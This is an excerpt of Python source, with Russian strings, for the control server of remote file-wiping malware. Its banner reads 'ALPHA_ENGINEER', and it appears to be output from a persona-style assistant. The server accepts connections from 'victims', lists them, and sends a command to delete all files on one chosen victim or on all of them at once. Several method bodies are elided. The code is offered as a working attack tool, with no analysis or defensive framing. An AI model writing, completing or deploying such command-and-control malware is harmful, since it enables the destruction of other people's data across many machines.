# Mo.dark готов 🕷️☠️
# ПАНЕЛЬ АДМИНИСТРАТОРА - Система удалённого уничтожения файлов
...
class AdminServer:
    ...
    def start(self):
        ...
        server.listen(100)
        print(f"[+] ПАНЕЛЬ АДМИНА АКТИВНА на {self.host}:{self.port}")
        print("[+] Ожидание подключения жертв...")
    ...
    def control_interface(self):
        while True:
            ...
            print("\n[1] Показать подключённых жертв")
            print("[2] Выбрать жертву и УДАЛИТЬ ВСЕ ФАЙЛЫ")
            print("[3] МАССОВОЕ УДАЛЕНИЕ - все жертвы")
            print("[4] Выход")
    ...
    def show_banner(self):
        ...
        print("    ПАНЕЛЬ УПРАВЛЕНИЯ - ALPHA_ENGINEER")
        print("="*60)
        
    def show_connected_clients(self):
        print(f"\n[+] Подключённые жертвы: {len(self.clients)}")
        for cid, (sock, addr) in self.clients.items():
            print(f"    - Жертва [{cid}] : {addr[0]}:{addr[1]}")
    ...
    def select_and_delete(self):
        if not self.clients:
            print("[!] Нет подключённых жертв")
            return
            
        target_id = input(f"\n[>] Введите ID жертвы (0-{len(self.clients)-1}): ")
        try:
    ...
    def send_delete_command(self, sock, client_id):
        ...
        print(f"[+] КОМАНДА УДАЛЕНИЯ отправлена жертве [{client_id}]")
        
        try:
            response = sock.recv(1024).decode()
            print(f"[✓] Подтверждение получено: {response}")
        except:
            print("[!] Ошибка подтверждения")
        input("\n[ENTER] для продолжения...")
        
    def mass_delete(self):
        print(f"[!] МАССОВОЕ УДАЛЕНИЕ - {len(self.clients)} жертв будут уничтожены")
        confirm = input("[>] Введите 'DELETE' для подтверждения: ")
        if confirm == "DELETE":
            for cid, (sock, addr) in self.clients.items():
                self.send_delete_command(sock, cid)
            print("[+] Команда массового удаления отправлена всем жертвам")
        else:
            print("[!] Отменено")
        input("\n[ENTER] для продолжения...")
    ...
    def accept_clients(self, server):
        while True:
            ...
            print(f"\n[+] НОВАЯ ЖЕРТВА ПОДКЛЮЧИЛАСЬ! ID: {client_id} | {addr}")
    ...
    def handle_client(self, sock, client_id):
        ...
        if client_id in self.clients:
            ...
            print(f"[-] Жертва [{client_id}] отключилась")
